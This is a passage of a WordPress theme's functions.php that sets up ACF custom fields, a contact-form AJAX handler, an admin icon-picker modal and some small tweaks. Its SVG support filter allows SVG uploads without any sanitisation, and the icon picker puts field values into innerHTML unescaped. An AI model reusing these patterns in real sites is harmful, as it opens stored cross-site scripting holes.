            'value'    => 'page-services.php',
        ))),
    ));



    // --- Pricing Page Fields ---
    acf_add_local_field_group(array(

        'key'    => 'group_pricing_page',
        'title'  => 'Pricing Page Plans',
        'fields' => array(
            array(
                'key'        => 'field_pricing_plans',
                'label'      => 'Pricing Plans List',
                'name'       => 'pricing_plans',
                'type'       => 'repeater',
                'layout'     => 'block',
                'sub_fields' => array(
                    array('key' => 'field_price_title',     'label' => 'Plan Title',        'name' => 'title',       'type' => 'text'),
                    array('key' => 'field_price_amount',    'label' => 'Price (e.g. 19)',   'name' => 'price',       'type' => 'text'),
                    array('key' => 'field_price_period',    'label' => 'Billing Period',    'name' => 'period',      'type' => 'text', 'default_value' => 'month'),
                    array('key' => 'field_price_features',  'label' => 'Features HTML List','name' => 'features',    'type' => 'wysiwyg', 'toolbar' => 'basic'),
                    array('key' => 'field_price_btn_text',  'label' => 'Button Text',       'name' => 'button_text', 'type' => 'text', 'default_value' => 'Buy Now'),
                    array('key' => 'field_price_btn_link',  'label' => 'Button Link',       'name' => 'button_link', 'type' => 'url'),
                    array('key' => 'field_price_featured',  'label' => 'Featured / Highlighted Plan', 'name' => 'featured', 'type' => 'true_false', 'ui' => 1),
                    array('key' => 'field_price_advanced',  'label' => 'Show "Advanced" Ribbon',      'name' => 'advanced', 'type' => 'true_false', 'ui' => 1),
                ),
            ),
        ),
        'location' => array(array(array(
            'param'    => 'page_template',
            'operator' => '==',
            'value'    => 'page-pricing.php',
        ))),
    ));

    // --- Testimonial CPT Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_testimonial',
        'title'  => 'Testimonial Details',
        'fields' => array(
            array('key' => 'field_test_role',  'label' => 'Designation / Role', 'name' => 'testimonial_designation', 'type' => 'text'),
            array('key' => 'field_test_stars', 'label' => 'Star Rating (1 to 5)','name' => 'testimonial_stars',      'type' => 'number', 'default_value' => 5, 'min' => 1, 'max' => 5),
        ),
        'location' => array(array(array(
            'param'    => 'post_type',
            'operator' => '==',
            'value'    => 'testimonial',
        ))),
    ));

    // --- Contact Page Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_contact_page',
        'title'  => 'Contact Page Settings',
        'fields' => array(
            array('key' => 'field_ct_tab_map',   'label' => 'Map Settings',   'type' => 'tab', 'placement' => 'left'),
            array('key' => 'field_ct_map_show',  'label' => 'Show Google Map','name' => 'contact_map_show', 'type' => 'true_false', 'default_value' => 1, 'ui' => 1),
            array('key' => 'field_ct_map_url',   'label' => 'Google Map Embed Iframe URL', 'name' => 'contact_map_url', 'type' => 'textarea', 'rows' => 3, 'conditional_logic' => array(array(array('field' => 'field_ct_map_show', 'operator' => '==', 'value' => '1')))),

            array('key' => 'field_ct_tab_info',  'label' => 'Contact Info',   'type' => 'tab'),
            array('key' => 'field_ct_address',   'label' => 'Address',        'name' => 'contact_address',   'type' => 'textarea', 'rows' => 3, 'default_value' => "A108 Adam Street\nNew York, NY 535022"),
            array('key' => 'field_ct_phone',     'label' => 'Phone Number',   'name' => 'contact_phone',     'type' => 'text', 'default_value' => '+1 5589 55488 55'),
            array('key' => 'field_ct_email',     'label' => 'Email Address',  'name' => 'contact_email',     'type' => 'email', 'default_value' => 'info@example.com'),

            array('key' => 'field_ct_tab_form',  'label' => 'Contact Form Builder',  'type' => 'tab'),
            array(
                'key'        => 'field_ct_form_fields',
                'label'      => 'Form Fields (Add / Edit / Remove Inputs)',
                'name'       => 'contact_form_fields',
                'type'       => 'repeater',
                'layout'     => 'block',
                'button_label' => 'Add New Field',
                'sub_fields' => array(
                    array(
                        'key'     => 'field_f_type',
                        'label'   => 'Field Type',
                        'name'    => 'type',
                        'type'    => 'select',
                        'choices' => array(
                            'text'     => 'Text Input',
                            'email'    => 'Email Input',
                            'tel'      => 'Phone Number (Tel)',
                            'textarea' => 'Textarea (Multi-line)',
                            'number'   => 'Number',
                        ),
                        'default_value' => 'text',
                    ),
                    array('key' => 'field_f_label',       'label' => 'Field Label (Optional)', 'name' => 'label',       'type' => 'text'),
                    array('key' => 'field_f_placeholder', 'label' => 'Placeholder Text',       'name' => 'placeholder', 'type' => 'text'),
                    array('key' => 'field_f_name',        'label' => 'Field Name Attribute',    'name' => 'name',        'type' => 'text'),
                    array(
                        'key'     => 'field_f_width',
                        'label'   => 'Column Width',
                        'name'    => 'width',
                        'type'    => 'select',
                        'choices' => array(
                            'col-md-6'  => 'Half Width (50%)',
                            'col-md-12' => 'Full Width (100%)',
                            'col-md-4'  => 'One Third (33%)',
                        ),
                        'default_value' => 'col-md-6',
                    ),
                    array('key' => 'field_f_req', 'label' => 'Is Required?', 'name' => 'required', 'type' => 'true_false', 'ui' => 1, 'default_value' => 1),
                ),
            ),
            array('key' => 'field_ct_btn_text',    'label' => 'Submit Button Text',  'name' => 'contact_btn_text',    'type' => 'text', 'default_value' => 'Send Message'),
            array('key' => 'field_ct_success_msg', 'label' => 'Success Alert Text',  'name' => 'contact_success_msg', 'type' => 'text', 'default_value' => 'Your message has been sent. Thank you!'),
            array('key' => 'field_ct_shortcode',   'label' => 'Or Use Plugin Shortcode (Optional)', 'name' => 'contact_form_shortcode', 'type' => 'text'),
        ),
        'location' => array(array(array(
            'param'    => 'page_template',
            'operator' => '==',
            'value'    => 'page-contact.php',
        ))),
    ));

    // --- Portfolio Page Settings Fields ---
    acf_add_local_field_group(array(
        'key'    => 'group_portfolio_page',
        'title'  => 'Portfolio Page Settings',
        'fields' => array(
            array(
                'key'        => 'field_pf_filters',
                'label'      => 'Category Filter Tabs (Manage Filter Buttons)',
                'name'       => 'portfolio_filters',
                'type'       => 'repeater',
                'layout'     => 'block',
                'button_label' => 'Add Filter Tab',
                'sub_fields' => array(
                    array('key' => 'field_flt_name',  'label' => 'Tab Name (e.g. App, Card, Web)', 'name' => 'name',  'type' => 'text'),
                    array('key' => 'field_flt_class', 'label' => 'CSS Filter Slug (e.g. .filter-app, .filter-product, .filter-branding)', 'name' => 'slug', 'type' => 'text'),
                ),
            ),
            array(
                'key'     => 'field_pf_order',
                'label'   => 'Order Projects By',
                'name'    => 'portfolio_orderby',
                'type'    => 'select',
                'choices' => array(
                    'date_desc' => 'Newest First (Date DESC)',
                    'date_asc'  => 'Oldest First (Date ASC)',
                    'title'     => 'Alphabetical (Title A-Z)',
                    'rand'      => 'Random Order',
                ),
                'default_value' => 'date_asc',
            ),
        ),
        'location' => array(array(array(
            'param'    => 'page_template',
            'operator' => '==',
            'value'    => 'page-portfolio.php',
        ))),
    ));

}
add_action('acf/init', 'sailor_register_acf_fields');




// ============================================================
// 6. ACF OPTIONS PAGE (for footer/global settings)
// ============================================================
function sailor_acf_options_page() {
    if (function_exists('acf_add_options_page')) {
        acf_add_options_page(array(
            'page_title'  => 'Site Settings',
            'menu_title'  => 'Site Settings',
            'menu_slug'   => 'sailor-options',
            'capability'  => 'manage_options',
            'redirect'    => false,
            'icon_url'    => 'dashicons-admin-settings',
            'position'    => 59,
        ));
    }
}
add_action('acf/init', 'sailor_acf_options_page');

// ============================================================
// 7. HELPER: Get Site Option (ACF Options Page field)
// ============================================================
function sailor_option($field_name, $default = '') {
    if (function_exists('get_field')) {
        $val = get_field($field_name, 'option');
        return $val ? $val : $default;
    }
    return $default;
}

// ============================================================
// 8. CONTACT FORM AJAX HANDLER
// ============================================================
function sailor_contact_form_handler() {
    check_ajax_referer('sailor_contact_nonce', 'nonce');

    $name    = sanitize_text_field($_POST['name'] ?? '');
    $email   = sanitize_email($_POST['email'] ?? '');
    $subject = sanitize_text_field($_POST['subject'] ?? '');
    $message = sanitize_textarea_field($_POST['message'] ?? '');

    if (empty($name) || empty($email) || empty($message)) {
        wp_send_json_error(array('message' => 'Please fill in all required fields.'));
    }

    $admin_email = get_option('admin_email');
    $mail_body   = "Name: $name\nEmail: $email\n\nMessage:\n$message";

    $sent = wp_mail($admin_email, "Contact Form: $subject", $mail_body, array(
        "From: $name <$email>",
        "Reply-To: $email",
    ));

    if ($sent) {
        wp_send_json_success(array('message' => 'Your message has been sent. Thank you!'));
    } else {
        wp_send_json_error(array('message' => 'Failed to send message. Please try again.'));
    }
}
add_action('wp_ajax_sailor_contact',        'sailor_contact_form_handler');
add_action('wp_ajax_nopriv_sailor_contact', 'sailor_contact_form_handler');

// Pass ajax URL to JS
function sailor_localize_scripts() {
    wp_localize_script('sailor-main-js', 'sailorAjax', array(
        'ajaxurl' => admin_url('admin-ajax.php'),
        'nonce'   => wp_create_nonce('sailor_contact_nonce'),
    ));
}
add_action('wp_enqueue_scripts', 'sailor_localize_scripts', 20);

// ============================================================
// 9. ADMIN LOGIN LOGO (optional branding)
// ============================================================
function sailor_login_logo() {
    if (has_custom_logo()) {
        $logo_id  = get_theme_mod('custom_logo');
        $logo_url = wp_get_attachment_image_url($logo_id, 'full');
        echo "<style>body.login #login h1 a {
            background-image: url('$logo_url');
            background-size: contain;
            background-position: center center;
            background-repeat: no-repeat;
            width: 100%;
        }</style>";
    }
}
add_action('login_head', 'sailor_login_logo');

//Admin favicon
function pa_admin_area_favicon() {
	$favicon_url = get_bloginfo("template_url") . '/images/favicon.png';
    echo '<link rel="shortcut icon" href="' . $favicon_url . '" />';
}
add_action('admin_head', 'pa_admin_area_favicon');


// ============================================================
// 10. VISUAL BOOTSTRAP ICON PICKER MODAL FOR WORDPRESS ADMIN
// ============================================================
function sailor_admin_icon_picker_assets($hook) {
    // Enqueue Bootstrap Icons in Admin
    wp_enqueue_style('bootstrap-icons-admin', 'https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css', array(), '1.11.3');
}
add_action('admin_enqueue_scripts', 'sailor_admin_icon_picker_assets');

function sailor_admin_icon_picker_modal() {
    $screen = get_current_screen();
    if (!$screen || ($screen->base !== 'post' && $screen->base !== 'page')) return;
    ?>
    <!-- Sailor Icon Picker Modal Styles -->
    <style>
      .sailor-icon-picker-widget {
        display: inline-flex !important;
        align-items: center !important;
        gap: 10px !important;
        background: #f8fafc !important;
        padding: 6px 10px !important;
        border: 1px solid #cbd5e1 !important;
        border-radius: 8px !important;
        box-shadow: 0 1px 3px rgba(0,0,0,0.05) !important;
        margin-top: 4px !important;
      }
      .sailor-icon-preview {
        width: 40px !important;
        height: 40px !important;
        background: #ffffff !important;
        border: 2px solid #d9232d !important;
        border-radius: 6px !important;
        display: inline-flex !important;
        align-items: center !important;
        justify-content: center !important;
        font-size: 22px !important;
        color: #d9232d !important;
        flex-shrink: 0 !important;
        box-shadow: 0 2px 4px rgba(217, 35, 45, 0.15) !important;
      }
      .sailor-icon-preview i {
        line-height: 1 !important;
      }
      .sailor-icon-display-input {
        background: #ffffff !important;
        border: 1px solid #cbd5e1 !important;
        border-radius: 6px !important;
        padding: 7px 12px !important;
        font-family: SFMono-Regular, Menlo, Monaco, Consolas, monospace !important;
        font-size: 13px !important;
        color: #334155 !important;
        width: 220px !important;
        margin: 0 !important;
        cursor: pointer !important;
      }
      .sailor-btn-choose-icon {
        background: #2563eb !important;
        border-color: #1d4ed8 !important;
        color: #ffffff !important;
        height: 38px !important;
        line-height: 36px !important;
        padding: 0 14px !important;
        border-radius: 6px !important;
        font-weight: 500 !important;
        display: inline-flex !important;
        align-items: center !important;
        gap: 6px !important;
        cursor: pointer !important;
        border: none !important;
        font-size: 13px !important;
        transition: all 0.2s ease !important;
      }
      .sailor-btn-choose-icon:hover {
        background: #1d4ed8 !important;
        color: #ffffff !important;
      }
      .sailor-btn-choose-icon i {
        font-size: 16px !important;
      }
      .sailor-icon-modal-overlay {
        position: fixed;
        top: 0; left: 0; width: 100vw; height: 100vh;
        background: rgba(0,0,0,0.65);
        backdrop-filter: blur(3px);
        z-index: 999999;
        display: none;
        align-items: center;
        justify-content: center;
      }
      .sailor-icon-modal-box {
        background: #ffffff;
        width: 90%;
        max-width: 820px;
        max-height: 85vh;
        border-radius: 10px;
        box-shadow: 0 10px 35px rgba(0,0,0,0.3);
        display: flex;
        flex-direction: column;
        overflow: hidden;
        animation: sailorModalFadeIn 0.2s ease-out;
      }
      @keyframes sailorModalFadeIn {
        from { opacity: 0; transform: scale(0.95); }
        to { opacity: 1; transform: scale(1); }
      }
      .sailor-modal-header {
        padding: 16px 22px;
        background: #f4f6f8;
        border-bottom: 1px solid #e2e8f0;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      .sailor-modal-header h3 {
        margin: 0;
        font-size: 18px;
        color: #1e293b;
        font-weight: 600;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      .sailor-modal-close {
        background: none;
        border: none;
        font-size: 24px;
        line-height: 1;
        cursor: pointer;
        color: #64748b;
        padding: 4px 8px;
        border-radius: 4px;
      }
      .sailor-modal-close:hover {
        background: #fee2e2;
        color: #ef4444;
      }
      .sailor-modal-search-bar {
        padding: 14px 22px;
        background: #ffffff;
        border-bottom: 1px solid #f1f5f9;
      }
      .sailor-modal-search-bar input {
        width: 100%;
        padding: 10px 16px;
        font-size: 15px;
        border: 1px solid #cbd5e1;
        border-radius: 6px;
        outline: none;
      }
      .sailor-modal-search-bar input:focus {
        border-color: #d9232d;
        box-shadow: 0 0 0 3px rgba(217, 35, 45, 0.15);
      }
      .sailor-modal-grid {
        padding: 18px 22px;
        overflow-y: auto;
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(85px, 1fr));
        gap: 12px;
        max-height: 55vh;
        background: #fcfcfc;
      }
      .sailor-icon-card {
        background: #ffffff;
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        padding: 12px 6px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        transition: all 0.2s ease;
        text-align: center;
      }
      .sailor-icon-card:hover {
        border-color: #d9232d;
        background: #fff5f5;
        transform: translateY(-2px);
        box-shadow: 0 4px 10px rgba(217, 35, 45, 0.15);
      }
      .sailor-icon-card i {
        font-size: 24px;
        color: #334155;
        margin-bottom: 6px;
        transition: 0.2s;
      }
      .sailor-icon-card:hover i {
        color: #d9232d;
        transform: scale(1.15);
      }
      .sailor-icon-card span {
        font-size: 10px;
        color: #64748b;
        word-break: break-all;
        line-height: 1.2;
        max-width: 100%;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
      }
      .sailor-modal-footer {
        padding: 12px 22px;
        background: #f8fafc;
        border-top: 1px solid #e2e8f0;
        font-size: 13px;
        color: #64748b;
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
    </style>

    <!-- Modal HTML -->
    <div id="sailor-icon-modal" class="sailor-icon-modal-overlay">
      <div class="sailor-icon-modal-box">
        <div class="sailor-modal-header">
          <h3><i class="bi bi-grid-3x3-gap"></i> Choose Bootstrap Icon</h3>
          <button type="button" class="sailor-modal-close">&times;</button>
        </div>
        <div class="sailor-modal-search-bar">
          <input type="text" id="sailor-icon-search-input" placeholder="🔍 Search icon (e.g. briefcase, chart, code, star, phone, cloud, rocket)...">
        </div>
        <div class="sailor-modal-grid" id="sailor-icon-grid">
          <!-- Icons populated dynamically by JS -->
        </div>
        <div class="sailor-modal-footer">
          <span id="sailor-icon-count">Showing 150+ Icons</span>
          <button type="button" class="button sailor-modal-close">Close</button>
        </div>
      </div>
    </div>

    <!-- Icon Picker Controller JS -->
    <script>
    document.addEventListener('DOMContentLoaded', function() {
      const iconsList = [
        "bi-briefcase", "bi-briefcase-fill", "bi-card-checklist", "bi-card-list", "bi-card-heading",
        "bi-bar-chart", "bi-bar-chart-line", "bi-bar-chart-fill", "bi-graph-up", "bi-graph-up-arrow", "bi-pie-chart",
        "bi-binoculars", "bi-binoculars-fill", "bi-search", "bi-zoom-in",
        "bi-brightness-high", "bi-brightness-high-fill", "bi-sun", "bi-lightning-charge", "bi-lightbulb",
        "bi-calendar4-week", "bi-calendar-check", "bi-calendar-event", "bi-calendar-date",
        "bi-code-slash", "bi-code", "bi-terminal", "bi-cpu", "bi-hdd-network", "bi-bug",
        "bi-laptop", "bi-display", "bi-pc-display", "bi-phone", "bi-tablet", "bi-smartwatch",
        "bi-palette", "bi-brush", "bi-paint-bucket", "bi-vector-pen", "bi-bezier2", "bi-magic",
        "bi-megaphone", "bi-broadcast", "bi-bullseye", "bi-send", "bi-envelope", "bi-chat-dots", "bi-chat-quote",
        "bi-shield-check", "bi-shield-lock", "bi-shield-shaded", "bi-lock", "bi-key", "bi-fingerprint",
        "bi-headset", "bi-telephone", "bi-telephone-inbound", "bi-question-circle", "bi-info-circle",
        "bi-gear", "bi-gear-fill", "bi-tools", "bi-wrench-adjustable", "bi-sliders", "bi-toggles",
        "bi-cart", "bi-cart-check", "bi-bag", "bi-shop", "bi-cash-coin", "bi-credit-card", "bi-wallet2",
        "bi-cloud", "bi-cloud-arrow-up", "bi-cloud-check", "bi-hdd", "bi-server", "bi-database",
        "bi-globe", "bi-globe-americas", "bi-geo-alt", "bi-compass", "bi-map", "bi-pin-map",
        "bi-trophy", "bi-award", "bi-star", "bi-star-fill", "bi-gem", "bi-patch-check", "bi-balloon",
        "bi-rocket", "bi-rocket-takeoff", "bi-speedometer2", "bi-activity", "bi-heart-pulse",
        "bi-building", "bi-buildings", "bi-house-door", "bi-boxes", "bi-box-seam", "bi-truck", "bi-airplane",
        "bi-camera", "bi-image", "bi-images", "bi-film", "bi-play-circle", "bi-mic", "bi-music-note",
        "bi-file-earmark-text", "bi-file-earmark-code", "bi-file-earmark-check", "bi-folder2-open",
        "bi-arrow-right-circle", "bi-check-circle", "bi-check2-all", "bi-plus-circle", "bi-star-half"
      ];

      const modal = document.getElementById('sailor-icon-modal');
      const grid = document.getElementById('sailor-icon-grid');
      const searchInput = document.getElementById('sailor-icon-search-input');
      const countEl = document.getElementById('sailor-icon-count');
      let activeInput = null;
      let activePreview = null;

      function renderIcons(filter = '') {
        grid.innerHTML = '';
        const filtered = iconsList.filter(name => name.toLowerCase().includes(filter.toLowerCase().trim()));
        countEl.textContent = `Showing ${filtered.length} Icons`;

        filtered.forEach(iconName => {
          const card = document.createElement('div');
          card.className = 'sailor-icon-card';
          const cleanName = iconName.replace('bi-', '');
          card.innerHTML = `<i class="bi ${iconName}"></i><span>${cleanName}</span>`;
          card.addEventListener('click', function() {
            if (activeInput) {
              activeInput.value = `bi ${iconName}`;
              activeInput.dispatchEvent(new Event('change', { bubbles: true }));
            }
            if (activePreview) {
              activePreview.innerHTML = `<i class="bi ${iconName}"></i>`;
            }
            closeModal();
          });
          grid.appendChild(card);
        });
      }

      function openModal(inputElem, previewElem) {
        activeInput = inputElem;
        activePreview = previewElem;
        searchInput.value = '';
        renderIcons();
        modal.style.display = 'flex';
        searchInput.focus();
      }

      function closeModal() {
        modal.style.display = 'none';
        activeInput = null;
        activePreview = null;
      }

      document.querySelectorAll('.sailor-modal-close').forEach(btn => {
        btn.addEventListener('click', closeModal);
      });

      modal.addEventListener('click', function(e) {
        if (e.target === modal) closeModal();
      });

      searchInput.addEventListener('input', function() {
        renderIcons(this.value);
      });

      // Attach sleek horizontal widget to all icon fields
      function initIconPickers() {
        const iconFields = document.querySelectorAll('.sailor-icon-picker-field input[type="text"], .acf-field[data-name="service_icon"] input[type="text"], .acf-field[data-name="icon"] input[type="text"]');
        iconFields.forEach(input => {
          if (input.dataset.pickerInit) return;
          input.dataset.pickerInit = '1';

          const currentVal = input.value.trim() || 'bi bi-briefcase';
          input.className += ' sailor-icon-display-input';

          const widget = document.createElement('div');
          widget.className = 'sailor-icon-picker-widget';

          const preview = document.createElement('div');
          preview.className = 'sailor-icon-preview';
          preview.innerHTML = `<i class="${currentVal}"></i>`;

          const btn = document.createElement('button');
          btn.type = 'button';
          btn.className = 'sailor-btn-choose-icon';
          btn.innerHTML = '<i class="bi bi-grid-fill"></i> Choose Icon from Library';
          btn.addEventListener('click', function(e) {
            e.preventDefault();
            openModal(input, preview);
          });

          // Replace default layout with sleek inline widget
          input.parentNode.insertBefore(widget, input);
          widget.appendChild(preview);
          widget.appendChild(input);
          widget.appendChild(btn);

          // Clicking either input or button opens modal
          input.addEventListener('click', function(e) {
            e.preventDefault();
            openModal(input, preview);
          });

          // Sync when input changes
          input.addEventListener('input', function() {
            preview.innerHTML = `<i class="${this.value.trim() || 'bi bi-briefcase'}"></i>`;
          });
        });
      }

      initIconPickers();
      if (window.acf) {
        window.acf.addAction('ready append', initIconPickers);
      }
    });
    </script>
    <?php
}
add_action('admin_footer', 'sailor_admin_icon_picker_modal');


register_nav_menu( 'primary', __( 'Primary Menu', 'Site Name' ) );

// Remove jQuery Migrate
add_action('wp_default_scripts', function($scripts) {
    if (!empty($scripts->registered['jquery'])) {
        $scripts->registered['jquery']->deps = array_diff($scripts->registered['jquery']->deps, array('jquery-migrate'));
    }
});

// SVG Support
function cc_mime_types($mimes) {
    $mimes['svg']  = 'image/svg+xml';
    $mimes['svgz'] = 'image/svg+xml';
    return $mimes;
}
add_filter('upload_mimes', 'cc_mime_types');

function isMobile() {
	return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}
#--------------------------------------------------------------------#
#	End Code													     #
#--------------------------------------------------------------------#
?>